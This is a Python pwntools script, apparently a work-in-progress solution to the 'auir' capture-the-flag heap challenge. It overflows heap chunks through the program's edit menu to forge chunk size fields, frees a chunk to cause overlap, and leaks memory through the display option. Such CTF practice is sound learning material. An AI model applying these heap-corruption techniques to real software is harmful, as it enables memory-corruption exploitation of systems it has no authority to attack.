import pwn as p
from pwnlib.util.misc import dealarm_shell

# target = p.process('./0ctfbabyheap', env={'LD_PRELOAD': './libc-2.23.so'})
target = p.process('./auir')
p.gdb.attach(target)

# methods to stop making pwn whine about bytes


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def make_zealots(size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'1')
    target.sendline(b(str(size)))
    target.sendline(payload)


def destroy_zealots(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'2')
    target.sendline(b(str(index)))


def fix_zealots(index: int, size: int, payload: bytes):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'3')
    target.sendline(b(str(index)))
    target.sendline(b(str(size)))
    target.sendline(payload)


def display_skills(index: int):
    prints(target.recvuntil(b'|-------------------------------|\n>>'))
    target.sendline(b'4')
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'[*]SHOWING....\n'))
    line = target.recvuntil(b'|-------------------------------|').rstrip(b'|-------------------------------|')
    return line


# fill tcache
# for i in range(7):
#     make_zealots(0x20, b'')
# for i in range(7):
#     destroy_zealots(i)

# for i in range(7):
#     make_zealots(0x40, b'')
# for i in range(7):
#     destroy_zealots(7+i)


make_zealots(0x20, b'0'*0x20)
make_zealots(0x20, b'1'*0x20)
make_zealots(0x20, b'2'*0x20)
make_zealots(0x20, b'3'*0x20)

fix_zealots(0, 0x30, b'A'*0x20+p.p64(0)+p.p64(0x61))
fix_zealots(1, 0x30, b'B'*0x20+p.p64(0x60)+p.p64(0x30))

destroy_zealots(2)

display_skills(1)

target.interactive()
